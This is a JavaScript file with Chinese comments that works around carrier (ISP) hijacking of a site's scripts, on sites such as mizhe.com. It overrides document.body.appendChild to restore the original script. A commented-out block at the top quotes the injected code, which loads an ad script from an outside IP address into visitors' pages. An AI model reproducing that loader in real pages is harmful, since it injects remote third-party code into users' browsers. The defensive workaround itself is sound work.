/*o = "A.js?";
sh = "http://61.160.200.156:9991/ad.0.js?v=3444&sp=999999&ty=dpc&sda_man=";
w = window;
d = document;
function ins(s, dm, id) {
    e = d.createElement("script");
    e.src = s;
    e.type = "text/javascript";
    id ? e.id = id : null;
    dm.appendChild(e);
}
;
p = d.scripts[d.scripts.length - 1].parentNode;
ins(o, p);
ds = function() {
    db = d.body;
    if (db && !document.getElementById("bdstat")) {
        if ((w.innerWidth || d.documentElement.clientWidth || db.clientWidth) > 1) {
            if (w.top == w.self) {
                ins(sh, db, "bdstat");
            }
        }
    } else {
        setTimeout("ds()", 1500);
    }
};
ds();*/

// -----------------上方是运营商替换掉某个js文件后的内容
/**
 * 页面中有A.js B.js C.js，依次执行。B.js C.js 都依赖A.js 中的代码。
 * 如果 A.js 被运营商替换掉了（当然，这是随机的），变成了上述代码。
 * 这些代码的初始化调用，ins(o, p) 的操作，将A.js? （原始正确的代码） 通过body.appendChild 到了页面最下面。
 * 然后就扯蛋了，页面js报错，整个页面瘫痪，再然后，它们的广告代码还安然无恙的出现在了页面右下角。（真不知道是哪个蠢驴写的）
 *
 * 因此，这里的临时解决方案是，通过覆盖document.body.appendChild方法，将原本要append到页面底部的A.js，拉回到原本要放置的位置。
 * 具体代码如下：
 */

/*
 * @note    用于运营商广告过滤 其直接替换整个文件内容，内部appendChild放回原来文件的做法
 *          具体其替换后的js文件内容 参见上方
 *          将此文件压缩完作为单独的一个js文件 作为第一个加载的脚本，效果更佳
 * @author  Xaber
 */
(function () {
    var fuck61160200156 = function () {
        var db = document.body,
            whiteList = ['mizhe.com', 'beibei.com'], // 自己网站的脚本服务器列表
            reg = new RegExp(whiteList.join('|'), 'gi'); // 其实也只是匹配src 所以只需要符合这里的正则就好了

        if (db && db.appendChild) {
            // 保存原始引用
            db._appendChild = db.appendChild;
            // 仅仅覆盖document.body 防止频繁操作和误操作
            // 仅仅针对上述场景
            db.appendChild = function (dom) {
                var domReady = false,
                    tagName = '';

                if (dom && dom.nodeType && dom.nodeType === 1) {
                    domReady = document.readyState === 'complete' ||
                            (document && document.getElementById && document.getElementsByTagName); // from Pro JavaScript Techniques  不太准确
                    if (!window.$ || !domReady || !(window.$ && window.$.isReady)) { // 确定domReady之后执行
                        if ((dom.nodeName || dom.tagName).toUpperCase() === 'SCRIPT') { // script 标签
                            if (dom.src && dom.src.search(reg) !== -1) { // 自己的域名
                                document.write('\<script src=\"' + dom.src + '\" type=\"text\/javascript\" id=\"bdstat\"\>\<\/script\>'); // 用于欺骗运营商广告中的bdstat判断 以及是否生效的测试考虑
                                return dom; // 该返回的返回
                            }
                        }
                    }
                }
                // return this._appendChild.call(this, dom); IE 6 7 8 这样的形式不可用会报错
                return db._appendChild(dom); // 原始调用
            };
        }
    };
    fuck61160200156();
})();
